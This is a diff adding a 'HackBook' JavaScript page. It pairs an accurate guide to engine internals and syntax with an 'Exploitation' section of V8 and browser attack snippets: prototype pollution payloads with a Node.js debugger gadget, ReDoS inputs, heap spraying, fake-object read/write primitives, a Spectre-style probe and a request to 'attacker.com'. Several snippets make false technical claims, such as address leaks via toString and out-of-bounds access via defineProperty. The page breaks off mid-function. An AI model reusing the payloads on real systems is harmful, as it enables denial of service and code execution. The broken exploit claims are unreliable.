@@ -1,0 +1,1177 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <script>
+      (function () {
+        const base = document.createElement("base");
+        if (location.hostname.includes("github.io")) {
+          base.href = `/HackBook/`;
+        } else {
+          const pathSegments = window.location.pathname
+            .split("/")
+            .filter((element) => element !== "");
+          const index = pathSegments.indexOf("HackBook");
+          pathSegments.splice(index + 1, pathSegments.length - (index + 1));
+          base.href = pathSegments.join("/") + "/";
+        }
+        document.head.appendChild(base);
+      })();
+    </script>
+
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/x-icon" href="assets\images\hacker.jpg" />
+
+    <title>HackBook | JavaScript</title>
+
+    <!-- Bootstrap CSS -->
+    <link
+      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css"
+      rel="stylesheet"
+    />
+    <!-- Bootstrap JS -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+    <!-- Prism JS -->
+    <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/prism.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-javascript.min.js"></script>
+    <!-- <link rel="stylesheet" href="https://unpkg.com/dracula-prism/dist/css/dracula-prism.css"> -->
+    <link
+      rel="stylesheet"
+      href="https://unpkg.com/prism-themes@1.6.0/themes/prism-duotone-sea.css"
+    />
+    <link
+      rel="stylesheet"
+      href="https://cdn.jsdelivr.net/npm/prismjs/plugins/command-line/prism-command-line.css"
+    />
+    <script src="https://cdn.jsdelivr.net/npm/prismjs/plugins/command-line/prism-command-line.min.js"></script>
+    <!-- Fonts -->
+    <link
+      href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap"
+      rel="stylesheet"
+    />
+
+    <script src="assets\scripts\main.js"></script>
+    <link rel="stylesheet" href="assets\styles\styles.css" />
+    <link rel="stylesheet" href="assets\styles\web.css" />
+  </head>
+  <body>
+    <!-- Main Content -->
+    <div class="content">
+      <h1>JavaScript</h1>
+      <hr />
+
+      <h2>Overview</h2>
+
+<h3>Under the Hood</h3>
+
+<h4>JavaScript Engine Architecture</h4>
+<p>
+  JavaScript engines (like V8 in Chrome/Node.js, SpiderMonkey in Firefox) execute
+  your code through several phases:
+</p>
+
+<div class="architecture-diagram">
+  <div class="arch-box">
+    <h5>1. Parsing Phase</h5>
+    <p>Source code → Abstract Syntax Tree (AST)</p>
+  </div>
+  <div class="arch-box">
+    <h5>2. Compilation Phase</h5>
+    <p>AST → Bytecode (JIT compilation)</p>
+  </div>
+  <div class="arch-box">
+    <h5>3. Execution Phase</h5>
+    <p>Bytecode executed by interpreter/compiler</p>
+  </div>
+</div>
+
+<h4>Memory Model: Heap & Stack</h4>
+
+<pre><code class="language-javascript">// Stack: Stores primitive values and execution contexts
+let x = 5;              // Stored directly in stack
+let name = "John";      // Reference to heap
+
+// Heap: Stores objects and complex data structures
+let obj = {age: 30};    // Object stored in heap, reference in stack
+let arr = [1, 2, 3];    // Array stored in heap</code></pre>
+
+<div class="memory-diagram">
+  <div class="memory-section">
+    <h5>Call Stack</h5>
+    <ul>
+      <li>Stores execution contexts</li>
+      <li>Primitive values (numbers, booleans)</li>
+      <li>References to heap objects</li>
+      <li>LIFO (Last In, First Out)</li>
+    </ul>
+  </div>
+  <div class="memory-section">
+    <h5>Memory Heap</h5>
+    <ul>
+      <li>Objects, arrays, functions</li>
+      <li>Unstructured memory pool</li>
+      <li>Garbage collected</li>
+      <li>Larger, slower access</li>
+    </ul>
+  </div>
+</div>
+
+<h4>Execution Context & Phases</h4>
+
+<pre><code class="language-javascript">// Example function to understand execution phases
+function calculate() {
+  var a = 10;           // Creation phase: a = undefined
+  let b = 20;           // Creation phase: b in TDZ
+  const c = 30;         // Creation phase: c in TDZ
+  
+  return a + b + c;     // Execution phase: values assigned
+}
+
+calculate();</code></pre>
+
+<div class="execution-phases">
+  <div class="phase-box">
+    <h5>Creation Phase (Memory Allocation)</h5>
+    <ul>
+      <li><code>var</code>: Initialized to <code>undefined</code></li>
+      <li><code>let/const</code>: In Temporal Dead Zone (TDZ)</li>
+      <li>Function declarations: Fully hoisted</li>
+      <li><code>this</code> binding determined</li>
+    </ul>
+  </div>
+  <div class="phase-box">
+    <h5>Execution Phase (Code Execution)</h5>
+    <ul>
+      <li>Variables assigned their values</li>
+      <li>Functions executed line by line</li>
+      <li>Expressions evaluated</li>
+      <li>Control flow processed</li>
+    </ul>
+  </div>
+</div>
+
+<h4>Event Loop & Asynchronous JavaScript</h4>
+
+<p>
+  JavaScript is single-threaded but handles async operations through the Event Loop,
+  which manages the Call Stack, Web APIs, and Task Queues.
+</p>
+
+<pre><code class="language-javascript">console.log("1: Synchronous");
+
+setTimeout(() => {
+  console.log("2: Macro task (Timer)");
+}, 0);
+
+Promise.resolve().then(() => {
+  console.log("3: Micro task (Promise)");
+});
+
+console.log("4: Synchronous");
+
+// Output: 1, 4, 3, 2</code></pre>
+
+<div class="event-loop-diagram">
+  <div class="event-loop-section">
+    <h5>Call Stack</h5>
+    <p>Executes synchronous code</p>
+  </div>
+  <div class="event-loop-section">
+    <h5>Web APIs</h5>
+    <p>Browser-provided APIs:<br>
+    - setTimeout/setInterval<br>
+    - fetch<br>
+    - DOM events<br>
+    - XMLHttpRequest</p>
+  </div>
+  <div class="event-loop-section">
+    <h5>Microtask Queue</h5>
+    <p>High priority:<br>
+    - Promises<br>
+    - MutationObserver<br>
+    - queueMicrotask()</p>
+  </div>
+  <div class="event-loop-section">
+    <h5>Macrotask Queue</h5>
+    <p>Standard priority:<br>
+    - setTimeout<br>
+    - setInterval<br>
+    - I/O operations</p>
+  </div>
+</div>
+
+<h4>Event Loop Execution Order</h4>
+
+<div class="execution-order">
+  <ol>
+    <li><strong>Execute synchronous code</strong> in call stack</li>
+    <li><strong>Process all microtasks</strong> (Promises, etc.)</li>
+    <li><strong>Render</strong> (if browser)</li>
+    <li><strong>Process one macrotask</strong> (setTimeout, etc.)</li>
+    <li><strong>Repeat</strong> from step 2</li>
+  </ol>
+</div>
+
+<pre><code class="language-javascript">// Complex example demonstrating execution order
+console.log('Start');
+
+setTimeout(() => console.log('Timeout 1'), 0);
+
+Promise.resolve()
+  .then(() => console.log('Promise 1'))
+  .then(() => console.log('Promise 2'));
+
+setTimeout(() => console.log('Timeout 2'), 0);
+
+Promise.resolve().then(() => {
+  console.log('Promise 3');
+  setTimeout(() => console.log('Timeout inside Promise'), 0);
+});
+
+console.log('End');
+
+/* Output:
+Start
+End
+Promise 1
+Promise 2
+Promise 3
+Timeout 1
+Timeout 2
+Timeout inside Promise
+*/</code></pre>
+
+<h4>Synchronous vs Asynchronous Code</h4>
+
+<div class="sync-async-comparison">
+  <div class="comparison-box">
+    <h5>Synchronous (Blocking)</h5>
+    <pre><code class="language-javascript">// Each line waits for previous to complete
+const data = readFileSync('file.txt');
+console.log(data);
+console.log('Done'); // Waits for file read</code></pre>
+    <ul>
+      <li>Executes line by line</li>
+      <li>Blocks further execution</li>
+      <li>Simple, predictable flow</li>
+      <li>Can freeze UI</li>
+    </ul>
+  </div>
+  
+  <div class="comparison-box">
+    <h5>Asynchronous (Non-blocking)</h5>
+    <pre><code class="language-javascript">// Doesn't wait, continues execution
+readFile('file.txt', (data) => {
+  console.log(data);
+});
+console.log('Done'); // Runs immediately</code></pre>
+    <ul>
+      <li>Initiates operation and continues</li>
+      <li>Uses callbacks/promises/async-await</li>
+      <li>Non-blocking, responsive</li>
+      <li>More complex flow</li>
+    </ul>
+  </div>
+</div>
+
+<h4>Web APIs vs JavaScript Runtime</h4>
+
+<div class="api-diagram">
+  <div class="api-section">
+    <h5>JavaScript Runtime (V8, etc.)</h5>
+    <ul>
+      <li>Call stack</li>
+      <li>Memory heap</li>
+      <li>Garbage collector</li>
+      <li>Event loop</li>
+    </ul>
+  </div>
+  
+  <div class="api-section">
+    <h5>Web APIs (Browser Provided)</h5>
+    <ul>
+      <li>DOM manipulation</li>
+      <li>setTimeout/setInterval</li>
+      <li>fetch/XMLHttpRequest</li>
+      <li>localStorage/sessionStorage</li>
+      <li>console.log</li>
+      <li>Geolocation, WebSockets, etc.</li>
+    </ul>
+  </div>
+</div>
+
+<pre><code class="language-javascript">// Web API example: setTimeout is NOT part of JavaScript
+// It's provided by the browser/Node.js environment
+
+setTimeout(() => {
+  console.log('This runs later');
+}, 1000);
+
+// Flow:
+// 1. setTimeout() called → handed to Web API
+// 2. JS continues executing (non-blocking)
+// 3. After 1000ms, Web API adds callback to macrotask queue
+// 4. Event loop moves callback to call stack when stack is empty
+// 5. Callback executes</code></pre>
+
+<h4>Hoisting</h4>
+
+<pre><code class="language-javascript">// Variables and functions are "hoisted" during creation phase
+
+console.log(x);        // undefined (not ReferenceError)
+var x = 5;
+
+console.log(y);        // ReferenceError: Cannot access 'y' before initialization
+let y = 10;
+
+greet();               // "Hello!" - functions fully hoisted
+function greet() {
+  console.log("Hello!");
+}
+
+sayHi();               // TypeError: sayHi is not a function
+var sayHi = () => {
+  console.log("Hi!");
+};</code></pre>
+
+<h4>Garbage Collection</h4>
+
+<pre><code class="language-javascript">// Mark-and-Sweep algorithm
+
+let obj = { data: "some data" };  // Object created in heap
+obj = null;                        // No references → eligible for GC
+
+// Memory leak example
+let leakyArray = [];
+setInterval(() => {
+  leakyArray.push(new Array(1000000)); // Keeps growing, never freed
+}, 100);
+
+// Proper cleanup
+let arr = [];
+let intervalId = setInterval(() => {
+  arr.push(new Array(1000));
+}, 100);
+
+// Clear when done
+clearInterval(intervalId);
+arr = null;</code></pre>
+
+      <h2>Syntax Cheatsheet</h2>
+
+      <div class="cheatsheet-section">
+        <h3>Variables & Data Types</h3>
+        <pre><code class="language-javascript">// Variables
+let x = 5;              // Block-scoped, reassignable
+const PI = 3.14;        // Block-scoped, constant
+var old = "legacy";     // Function-scoped (or global if not in function)
+
+// Data Types
+let str = "text";       // String
+let num = 42;           // Number
+let bool = true;        // Boolean
+let arr = [1,2,3];      // Array
+let obj = {key: "val"}; // Object
+let nul = null;         // Null
+let undef;              // Undefined
+let sym = Symbol("id"); // Symbol
+let big = 10n;          // BigInt</code></pre>
+      </div>
+
+      <div class="cheatsheet-section">
+        <h3>Operators</h3>
+        <pre><code class="language-javascript">// Arithmetic: + - * / % **
+// Assignment: = += -= *= /= %= **=
+// Comparison: == === != !== > < >= <=
+// Logical: && || !
+// Ternary: condition ? true : false
+// Nullish: ?? (returns right if left is null/undefined)
+// Optional chaining: obj?.prop?.method?.()</code></pre>
+      </div>
+
+      <div class="cheatsheet-section">
+        <h3>Control Flow</h3>
+        <pre><code class="language-javascript">// If/Else
+if (x > 0) { } else if (x < 0) { } else { }
+
+// Switch
+switch(val) {
+  case 1: break;
+  case 2: break;
+  default: break;
+}
+
+// Loops
+for (let i = 0; i < 5; i++) { }
+for (let item of array) { }
+for (let key in object) { }
+while (condition) { }
+do { } while (condition);</code></pre>
+      </div>
+
+      <div class="cheatsheet-section">
+        <h3>Functions</h3>
+        <pre><code class="language-javascript">// Function Declaration
+function add(a, b) { return a + b; }
+
+// Arrow Functions
+const multiply = (a, b) => a * b;
+const greet = name => `Hello ${name}`;
+
+// Default Parameters
+function pow(x, n = 2) { return x ** n; }
+
+// Rest Parameters
+function sum(...nums) { return nums.reduce((a,b) => a+b, 0); }
+
+// Destructuring
+const [first, ...rest] = [1,2,3,4];
+const {name, age} = {name: "John", age: 30};</code></pre>
+      </div>
+
+      <div class="cheatsheet-section">
+        <h3>Arrays</h3>
+        <pre><code class="language-javascript">// Common Methods
+arr.push(item);         // Add to end
+arr.pop();              // Remove from end
+arr.shift();            // Remove from start
+arr.unshift(item);      // Add to start
+arr.splice(i, n);       // Remove n items at index i
+arr.slice(start, end);  // Copy portion
+arr.concat(arr2);       // Merge arrays
+
+// Iteration
+arr.forEach(item => console.log(item));
+arr.map(x => x * 2);    // Transform
+arr.filter(x => x > 5); // Filter
+arr.find(x => x > 5);   // Find first
+arr.reduce((acc, x) => acc + x, 0); // Reduce
+arr.some(x => x > 5);   // Any match?
+arr.every(x => x > 0);  // All match?</code></pre>
+      </div>
+
+      <div class="cheatsheet-section">
+        <h3>Objects</h3>
+        <pre><code class="language-javascript">// Creation
+const obj = {key: "value", method() { }};
+const obj2 = new Object();
+
+// Access
+obj.key; obj["key"];
+
+// Methods
+Object.keys(obj);       // ["key"]
+Object.values(obj);     // ["value"]
+Object.entries(obj);    // [["key", "value"]]
+Object.assign({}, obj); // Shallow copy
+{...obj};               // Spread (shallow copy)
+
+// Destructuring
+const {key, method} = obj;</code></pre>
+      </div>
+
+      <div class="cheatsheet-section">
+        <h3>Strings</h3>
+        <pre><code class="language-javascript">// Template Literals
+`Hello ${name}, you are ${age} years old`
+
+// Methods
+str.length;             // Length
+str.toUpperCase();      // UPPERCASE
+str.toLowerCase();      // lowercase
+str.trim();             // Remove whitespace
+str.split(sep);         // Split to array
+str.substring(0, 5);    // Extract substring
+str.includes("text");   // Contains?
+str.startsWith("Hi");   // Starts with?
+str.endsWith("!");      // Ends with?
+str.replace("old", "new"); // Replace first
+str.replaceAll("a", "b");  // Replace all</code></pre>
+      </div>
+
+      <div class="cheatsheet-section">
+        <h3>Classes</h3>
+        <pre><code class="language-javascript">class Person {
+  constructor(name, age) {
+    this.name = name;
+    this.age = age;
+  }
+  
+  greet() {
+    return `Hi, I'm ${this.name}`;
+  }
+  
+  static species = "Human";
+}
+
+class Student extends Person {
+  constructor(name, age, grade) {
+    super(name, age);
+    this.grade = grade;
+  }
+}</code></pre>
+      </div>
+
+      <div class="cheatsheet-section">
+        <h3>Async/Promises</h3>
+        <pre><code class="language-javascript">// Promise
+const promise = new Promise((resolve, reject) => {
+  if (success) resolve(data);
+  else reject(error);
+});
+
+promise
+  .then(data => console.log(data))
+  .catch(err => console.error(err))
+  .finally(() => console.log("Done"));
+
+// Async/Await
+async function fetchData() {
+  try {
+    const response = await fetch(url);
+    const data = await response.json();
+    return data;
+  } catch (error) {
+    console.error(error);
+  }
+}
+
+// Promise.all / race
+Promise.all([p1, p2, p3]);
+Promise.race([p1, p2, p3]);</code></pre>
+      </div>
+
+      <div class="cheatsheet-section">
+        <h3>DOM Manipulation</h3>
+        <pre><code class="language-javascript">// Selection
+document.getElementById("id");
+document.querySelector(".class");
+document.querySelectorAll("div");
+
+// Manipulation
+elem.textContent = "text";
+elem.innerHTML = "<b>html</b>";
+elem.setAttribute("attr", "val");
+elem.classList.add/remove/toggle("class");
+elem.style.color = "red";
+
+// Events
+elem.addEventListener("click", (e) => {});
+elem.removeEventListener("click", handler);
+
+// Creation
+const div = document.createElement("div");
+parent.appendChild(div);
+parent.removeChild(div);</code></pre>
+      </div>
+
+      <div class="cheatsheet-section">
+        <h3>Error Handling</h3>
+        <pre><code class="language-javascript">try {
+  // Code that may throw
+  throw new Error("Custom error");
+} catch (error) {
+  console.error(error.message);
+} finally {
+  // Always executes
+}</code></pre>
+      </div>
+
+      <div class="cheatsheet-section">
+        <h3>Common Patterns</h3>
+        <pre><code class="language-javascript">// IIFE (Immediately Invoked Function Expression)
+(function() { /* code */ })();
+
+// Debounce
+const debounce = (fn, delay) => {
+  let timer;
+  return (...args) => {
+    clearTimeout(timer);
+    timer = setTimeout(() => fn(...args), delay);
+  };
+};
+
+// Deep Clone
+const clone = JSON.parse(JSON.stringify(obj));
+const clone2 = structuredClone(obj); // Modern
+
+// Object Freeze
+Object.freeze(obj); // Immutable</code></pre>
+      </div>
+
+
+    <!-- ...existing code... -->
+
+    <h2>Exploitation</h2>
+
+    <div class="cheatsheet-section">
+      <h3>JavaScript Engine Fundamentals</h3>
+      <pre><code class="language-javascript">// Understanding engine internals for exploitation
+// V8 uses hidden classes and inline caches for optimization
+
+// Object shape (hidden class) example
+let obj1 = {a: 1, b: 2};  // Hidden class A
+let obj2 = {a: 1, b: 2};  // Same hidden class A
+let obj3 = {a: 1};        // Different hidden class B
+obj3.b = 2;               // Transitions to hidden class A
+
+// Inline cache poisoning concept
+function add(obj) {
+  return obj.x + obj.y;  // IC caches object shape
+}
+
+// First calls establish IC
+add({x: 1, y: 2});
+add({x: 3, y: 4});
+
+// Different shape can cause deoptimization
+add({y: 5, x: 6});  // Properties in different order</code></pre>
+    </div>
+
+    <div class="cheatsheet-section">
+      <h3>V8 Heap Structure</h3>
+      <pre><code class="language-javascript">// V8 uses different heap spaces
+// Understanding these is crucial for exploitation
+
+/*
+Heap Spaces in V8:
+- New Space: Young generation objects (1-8MB)
+  - From-space: Active objects
+  - To-space: Used during garbage collection
+- Old Space: Old generation objects that survived GC
+- Large Object Space: Objects > 512KB
+- Code Space: JIT compiled code
+- Map Space: Hidden classes (maps)
+*/
+
+// SMI (Small Integer) optimization
+let smi = 42;              // Stored as SMI (31-bit signed int)
+let heap = 2147483648;     // Too large, stored as HeapNumber
+
+// Pointer tagging in V8
+// Last bit indicates SMI (0) or pointer (1)
+// SMIs are left-shifted by 1
+// 42 = 0b101010 → 0b1010100 (84) as tagged SMI</code></pre>
+    </div>
+
+    <div class="cheatsheet-section">
+      <h3>Type Confusion</h3>
+      <pre><code class="language-javascript">// Type confusion through prototype pollution
+Object.prototype.x = 123;
+
+function typeConfusion(obj) {
+  // Engine may assume obj.x is always SMI
+  return obj.x * 2;
+}
+
+let normalObj = {x: 5};
+typeConfusion(normalObj);  // Returns 10
+
+// Trigger confusion
+delete normalObj.x;
+typeConfusion(normalObj);  // Returns 246 (from prototype)
+
+// Array type confusion
+let arr = [1, 2, 3];       // PACKED_SMI_ELEMENTS
+arr[1000] = 1;             // Transitions to HOLEY_SMI_ELEMENTS
+arr[0] = 1.1;              // Transitions to PACKED_DOUBLE_ELEMENTS
+
+// Exploit: Force array transition to confuse bounds checks
+function oobRead(arr) {
+  return arr[10];  // Engine may not check bounds after optimization
+}</code></pre>
+    </div>
+
+    <div class="cheatsheet-section">
+      <h3>JIT Compiler Exploitation</h3>
+      <pre><code class="language-javascript">// Triggering JIT compilation
+// V8: Function must be called multiple times
+function hotFunction(x) {
+  return x * 2;
+}
+
+// Warm up the function (trigger TurboFan compilation)
+for (let i = 0; i < 10000; i++) {
+  hotFunction(i);
+}
+
+// Now optimized code is used
+// Exploit: Deoptimization can cause issues
+
+// JIT spray technique
+function jitSpray() {
+  // Large number of constants can be embedded in JIT code
+  return 0x41414141 + 
+         0x42424242 + 
+         0x43434343 +
+         // ... thousands more constants
+         0x90909090;  // NOP sled
+}
+
+// Side-channel attacks on JIT
+function timingAttack(fn) {
+  let start = performance.now();
+  fn();
+  let end = performance.now();
+  return end - start;
+}
+
+// Detect if function is optimized
+function isOptimized(fn) {
+  %OptimizeFunctionOnNextCall(fn);  // V8 debug flag required
+  fn();
+  return %GetOptimizationStatus(fn);
+}</code></pre>
+    </div>
+
+    <div class="cheatsheet-section">
+      <h3>ArrayBuffer & TypedArray Exploitation</h3>
+      <pre><code class="language-javascript">// Arbitrary read/write primitives using TypedArrays
+
+// Out-of-bounds access
+let buf = new ArrayBuffer(16);
+let view = new DataView(buf);
+
+// Exploit: Confuse length property
+Object.defineProperty(view, 'byteLength', {
+  get: () => 0x7fffffff  // Fake length
+});
+
+// Arbitrary read primitive
+function read64(addr) {
+  let buf = new ArrayBuffer(8);
+  let view = new DataView(buf);
+  // Exploit: Corrupt buffer's backing store pointer
+  // to point to addr (requires vulnerability)
+  return view.getBigUint64(0, true);
+}
+
+// Arbitrary write primitive
+function write64(addr, value) {
+  let buf = new ArrayBuffer(8);
+  let view = new DataView(buf);
+  // Exploit: Corrupt backing store
+  view.setBigUint64(0, value, true);
+}
+
+// Convert between different views
+let f64 = new Float64Array(1);
+let u32 = new Uint32Array(f64.buffer);
+
+function f2i(f) {
+  f64[0] = f;
+  return [u32[0], u32[1]];  // Get raw bits
+}
+
+function i2f(lo, hi) {
+  u32[0] = lo;
+  u32[1] = hi;
+  return f64[0];
+}</code></pre>
+    </div>
+
+    <div class="cheatsheet-section">
+      <h3>Prototype Pollution Gadgets</h3>
+      <pre><code class="language-javascript">// Pollute Object.prototype
+Object.prototype.polluted = 'pwned';
+
+// Check pollution
+let obj = {};
+console.log(obj.polluted);  // 'pwned'
+
+// Pollution via constructor
+let obj = {};
+obj.__proto__.constructor.prototype.polluted = 'pwned';
+
+// Pollution via recursive merge
+function merge(target, source) {
+  for (let key in source) {
+    if (typeof source[key] === 'object') {
+      target[key] = merge(target[key] || {}, source[key]);
+    } else {
+      target[key] = source[key];
+    }
+  }
+  return target;
+}
+
+// Exploit
+let malicious = JSON.parse('{"__proto__": {"polluted": "pwned"}}');
+merge({}, malicious);
+
+// Gadget chains for RCE (Node.js)
+Object.prototype.env = {NODE_OPTIONS: '--inspect=0.0.0.0:9229'};
+// Next process spawn will have debug enabled
+
+// Bypass using Object.create(null)
+let safe = Object.create(null);  // No prototype
+safe.polluted;  // undefined</code></pre>
+    </div>
+
+    <div class="cheatsheet-section">
+      <h3>RegExp Engine Exploitation</h3>
+      <pre><code class="language-javascript">// ReDoS (Regular Expression Denial of Service)
+// Catastrophic backtracking
+
+// Evil regex patterns
+let evil1 = /^(a+)+$/;
+let evil2 = /^(a|a)*$/;
+let evil3 = /^(a|ab)*$/;
+
+// Exploit: Input causes exponential backtracking
+let payload = 'a'.repeat(30) + 'b';
+evil1.test(payload);  // Hangs for ~30 seconds
+
+// RegExp heap spray
+let pattern = new RegExp('A'.repeat(0x10000));
+// Large regex can be used to groom heap
+
+// Unicode exploitation
+let unicode = /\u{1F4A9}/u;  // Emoji
+// Engine may have bugs in Unicode handling
+
+// Lookahead/lookbehind bugs
+let lookbehind = /(?<=\d{4})\w+/;
+// Some engines have vulnerabilities in assertions</code></pre>
+    </div>
+
+    <div class="cheatsheet-section">
+      <h3>Garbage Collection Exploitation</h3>
+      <pre><code class="language-javascript">// Force garbage collection (V8 debug)
+if (typeof gc === 'function') {
+  gc();
+}
+
+// Use-after-free exploitation concept
+let obj = {data: 'sensitive'};
+let ref = obj;
+
+obj = null;  // Remove reference
+gc();        // Trigger GC (obj might be freed)
+
+// If vulnerability exists, ref might point to freed memory
+console.log(ref.data);  // UAF if object was freed
+
+// Heap spray to control freed memory
+let spray = [];
+for (let i = 0; i < 10000; i++) {
+  spray.push({controlled: 0x41414141});
+}
+
+// Finalizer exploitation
+let registry = new FinalizationRegistry((heldValue) => {
+  console.log('Object collected:', heldValue);
+});
+
+let target = {sensitive: 'data'};
+registry.register(target, 'my-object');
+target = null;  // Eventually triggers finalizer</code></pre>
+    </div>
+
+    <div class="cheatsheet-section">
+      <h3>WebAssembly Exploitation</h3>
+      <pre><code class="language-javascript">// WASM can bypass some JavaScript mitigations
+
+// Basic WASM module
+let wasmCode = new Uint8Array([
+  0x00, 0x61, 0x73, 0x6d,  // Magic: '\0asm'
+  0x01, 0x00, 0x00, 0x00,  // Version: 1
+  // ... function definitions
+]);
+
+let wasmModule = new WebAssembly.Module(wasmCode);
+let wasmInstance = new WebAssembly.Instance(wasmModule);
+
+// Shared memory exploitation
+let sharedBuf = new SharedArrayBuffer(1024);
+let sharedArray = new Uint32Array(sharedBuf);
+
+// Race condition with Atomics
+function racyWrite() {
+  Atomics.store(sharedArray, 0, 0x41414141);
+}
+
+// WASM linear memory corruption
+let memory = new WebAssembly.Memory({initial: 1});
+let memView = new Uint8Array(memory.buffer);
+
+// Exploit: Overflow WASM linear memory
+// (requires vulnerability in WASM implementation)
+memView[0x10000] = 0x90;  // Beyond page boundary
+
+// WASM table confusion
+let table = new WebAssembly.Table({
+  initial: 10,
+  element: 'anyfunc'
+});
+
+// Exploit: Confuse function pointers in table</code></pre>
+    </div>
+
+    <div class="cheatsheet-section">
+      <h3>Side-Channel Attacks</h3>
+      <pre><code class="language-javascript">// Timing attacks using performance.now()
+function timingOracle(fn) {
+  let start = performance.now();
+  fn();
+  let end = performance.now();
+  return end - start;
+}
+
+// Cache timing attacks (Spectre-like)
+let arr1 = new Uint8Array(256 * 512);
+let arr2 = new Uint8Array(256 * 512);
+
+function trainPredictor() {
+  for (let i = 0; i < 1000; i++) {
+    // Train branch predictor
+    if (i < 100) {
+      arr1[i * 512]++;
+    }
+  }
+}
+
+function speculativeRead(idx) {
+  // Speculative execution may read beyond bounds
+  let val = arr1[idx * 512];
+  arr2[val * 512]++;  // Side effect observable via timing
+}
+
+// Probe which cache line was accessed
+function probe() {
+  let results = [];
+  for (let i = 0; i < 256; i++) {
+    let start = performance.now();
+    let _ = arr2[i * 512];
+    let time = performance.now() - start;
+    results.push({byte: i, time});
+  }
+  return results.sort((a, b) => a.time - b.time)[0].byte;
+}
+
+// Cross-origin timing attacks
+function xsleaksTiming(url) {
+  let start = performance.now();
+  let img = new Image();
+  img.src = url;
+  img.onload = () => {
+    let time = performance.now() - start;
+    console.log('Load time:', time);
+  };
+}</code></pre>
+    </div>
+
+    <div class="cheatsheet-section">
+      <h3>Browser Exploitation Primitives</h3>
+      <pre><code class="language-javascript">// Information disclosure via error messages
+try {
+  fetch('http://attacker.com', {mode: 'no-cors'});
+} catch(e) {
+  // Error message may leak information
+  console.log(e.message);
+}
+
+// Leak object addresses (V8 older versions)
+let obj = {a: 1};
+let leak = obj.toString();  // [object Object] @ 0x...
+
+// Arbitrary code execution primitive (requires RW)
+function arbExec(shellcode) {
+  // 1. Allocate RWX memory (requires vulnerability)
+  // 2. Write shellcode
+  // 3. Corrupt function pointer to point to shellcode
+  // 4. Call corrupted function
+}
+
+// Browser sandbox escape chains
+// 1. JavaScript engine exploit → code execution
+// 2. Renderer exploit → escape sandbox
+// 3. Kernel exploit → full system compromise
+
+// Heap grooming for exploitation
+function heapGroom() {
+  let spray = [];
+  
+  // Fill holes in heap
+  for (let i = 0; i < 1000; i++) {
+    spray.push(new ArrayBuffer(0x1000));
+  }
+  
+  // Create holes
+  for (let i = 0; i < spray.length; i += 2) {
+    spray[i] = null;
+  }
+  
+  // Trigger GC to consolidate
+  if (typeof gc === 'function') gc();
+  
+  // Allocate target objects in controlled locations
+  let targets = [];
+  for (let i = 0; i < 500; i++) {
+    targets.push({controlled: 0x41414141});
+  }
+}</code></pre>
+    </div>
+
+    <div class="cheatsheet-section">
+      <h3>JIT Optimization Bypasses</h3>
+      <pre><code class="language-javascript">// Prevent inlining
+function noinline(f) {
+  try { } finally { }  // Forces no-inline in some engines
+  return f;
+}
+
+// Prevent optimization
+function noOptimize() {
+  with ({}) { }  // 'with' prevents optimization
+  eval('');      // eval prevents optimization
+  try { } catch (e) { }  // try-catch can prevent optimization
+}
+
+// Force deoptimization
+function deoptimize(fn) {
+  fn({}); // Call with object
+  fn({different: 'shape'}); // Different shape forces deopt
+  fn([]);  // Different type forces deopt
+}
+
+// Detect optimization level
+function getOptLevel(fn) {
+  // Warm up
+  for (let i = 0; i < 10000; i++) fn(i);
+  
+  // Time execution
+  let start = performance.now();
+  for (let i = 0; i < 100000; i++) fn(i);
+  let optimizedTime = performance.now() - start;
+  
+  // Force deopt
+  fn({});
+  
+  // Time again
+  start = performance.now();
+  for (let i = 0; i < 100000; i++) fn(i);
+  let unoptimizedTime = performance.now() - start;
+  
+  return unoptimizedTime / optimizedTime;  // > 1 if was optimized
+}</code></pre>
+    </div>
+
+    <div class="cheatsheet-section">
+      <h3>Memory Corruption Techniques</h3>
+      <pre><code class="language-javascript">// Array bounds confusion
+function oobWrite(arr, idx, val) {
+  // Exploit: Confuse engine about array length
+  Object.defineProperty(arr, 'length', {
+    get: () => 0x7fffffff
+  });
+  arr[idx] = val;  // Write beyond actual bounds
+}
+
+// Fake object creation
+function fakeObject(addr) {
+  // Exploit: Craft fake object at address
+  // Requires ability to write to arbitrary address
+  
+  // Typical V8 object layout:
+  // +0: Map pointer
+  // +8: Properties pointer
+  // +16: Elements pointer
+  // +24+: Inline properties
+  
+  let fakeMap = addr + 0x100;
+  let fakeProps = addr + 0x200;
+  write64(addr, fakeMap);      // Map
+  write64(addr + 8, fakeProps); // Properties
+}
+
+// Fake typed array for arbitrary R/W
+function fakeTypedArray(backingStore) {
+  let fakeArray = fakeObject(0x1000);
+  
+  // Set up as Float64Array
+  write64(fakeArray, float64ArrayMap);
+  write64(fakeArray + 0x20, backingStore);  // Backing store
+  write64(fakeArray + 0x28, 0x7fffffff);    // Length
+  
+  return fakeArray;
+}
+
+// Address space layout discovery
+function findObjects() {
+  let addrs = [];
+  for (let i = 0; i < 1000; i++) {
+    let obj = {marker: 0x1337};
+    // Scan memory for marker
+    // (requires arbitrary read primitive)
+  }
+  return addrs;
+}</code></pre>
+    </div>
+
+    <div class="cheatsheet-section">
+      <h3>Exploitation Helpers</h3>
+      <pre><code class="language-javascript">// Integer conversion helpers
+function u32(val) {
+  return val >>> 0;  // Convert to unsigned 32-bit
+}
+
+function i32(val) {
+  return val | 0;  // Convert to signed 32-bit
+}
+
+// Pack/unpack 64-bit integers
+function pack64(lo, hi) {
+  return (BigInt(hi) << 32n) | BigInt(lo);
+}
+
+function unpack64(val) {
+  return [Number(val & 0xffffffffn), Number(val >> 32n)];
+}
+
+// Float/Int conversion (for address manipulation)
+let convBuf = new ArrayBuffer(8);
+let convF64 = new Float64Array(convBuf);
+let convU32 = new Uint32Array(convBuf);
+
+function f2u(f) {
+  convF64[0] = f;
+  return [convU32[0], convU32[1]];
+}
+
+function u2f(lo, hi) {
+  convU32[0] = lo;
+  convU32[1] = hi;
+  return convF64[0];
+}
+
+// Hexdump helper
+function hexdump(arr, offset = 0, length = 64) {
+  for (let i = 0; i < length; i += 16) {
+    let hex = '';
+    let ascii = '';
+    for (let j = 0; j < 16 && i + j < length; j++) {
+      let byte = arr[offset + i + j];
